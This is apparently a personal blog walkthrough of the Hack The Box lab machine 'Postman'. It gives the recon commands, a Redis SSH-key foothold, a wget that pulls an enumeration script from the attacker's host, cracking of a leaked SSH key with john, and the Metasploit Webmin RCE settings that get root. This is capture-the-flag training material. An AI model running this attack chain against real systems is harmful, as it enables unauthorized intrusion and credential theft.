---
title: Postman Hackthebox Writeup
layout: post
category: hackthebox
tags: hackthebox writeup
date: 2020-04-07
---

Hello readers, this is not a write-up but a quick walk through of the postman box on hackthebox , just to give a quick path for pwning the box. Follow me on twitter for more.

# About
* Name: Postman
* IP: 10.10.10.160
* Level: Easy
* Os: Linux
* Released : 02/Nov/2019


# Enumeration
1. Commands used for recon:
```
nmap -sC -sV -oN nmap.txt 10.10.10.160
nmap -sC -sV -oN nmap_all.txt -p- 10.10.10.160
gobuster -u http://10.10.10.160/ -w <path to wordlist> -t 20 -o dirscan1.txt
gobuster -u http://10.10.10.160:10000 -w <path to wordlist> -t 20 -o dirscan2.txt
```
2. Following results were found from the recon.
```
Bootstrap 4.0 and jQuery 1.12 on port 80.
22 OpenSSH 7.6p1 ( No working exploit found)
80 Apache httpd 2.4.29 ( No working exploit found)
10000 port http (Webmin — MiniServ 1.910)
Operating System (Ubuntu 4ubuntu0.3)
‘http://10.10.10.160/uploads’ directory found on port 80.
‘https://postman:10000/session_login.cgi ’(Login url found).
Redis key-value store 4.0.9 on port 6379 (Revealed after full port scan) .
```

# Exploitation (User)
1. Found a exploit for redis service on port 6379 on github .
2. Tweaked the exploit to change the ‘config set dir’ command to ‘command set dir /var/lib/redis/.ssh’
3. Logging in with ssh gives us a low privileged shell as user ‘redis’ on the box.
4. Create a python http server on our machine to transfer our linenum script to the box.
```
python3 http.server
```
5. Downloading the script to host
```
wget http://<ip of your machine>:8000/linenum.sh
```
6. Running linenum enumeration script on the host reveals a ‘id_rsa.back’ file present in ‘/opt’ directory.
7. Copying the contents of the ‘ id_rsa.bak’ file to our machine.
8. Convert the file to john format.
```
ssh2john id_rsa.back > hash.txt
```
9. Dictionary attack on the file reveals the password ‘computer2008’ for the user Matt.
```
john — wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
10. From our previous redis shell we login as user ‘Matt’ using password ‘computer2008’.
```
su Matt
```
11. Traversing to Matt’s home directory and finding ‘user.txt’
```
cd /home/matt ; cat user.txt
```


# Exploitation(Root)
1. For root escalation we exploit the ‘webmin’ hosted on port 10000.
2. We use webmin package updates remote command execution exploit present in metasploit.
```
sudo msfconsole to open metasploit.
set ssl on
set username Matt
set password computer2008
set LHOST tun0
set RHOST 10.10.10.160
exploit
```
3. We get a shell as root on the box
```
cat root/root.txt
``` 

# Conclusion
This is how we can pwn the postman box. Hope you all find this useful. I will try to create detailed write-ups for boxes in the future (if i don’t feel lazy xD).